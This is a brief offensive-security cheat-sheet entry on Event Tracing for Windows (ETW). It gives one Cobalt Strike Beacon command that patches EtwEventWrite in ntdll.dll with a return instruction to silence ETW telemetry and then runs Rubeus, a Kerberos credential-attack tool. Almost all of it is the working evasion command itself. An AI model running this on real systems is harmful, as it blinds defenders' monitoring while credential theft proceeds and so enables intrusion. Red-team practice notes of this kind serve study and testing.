# ETW

- Patch the EtwEventWrite exported function inside ntdll.dlls in Beacon

```
beacon> execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
```
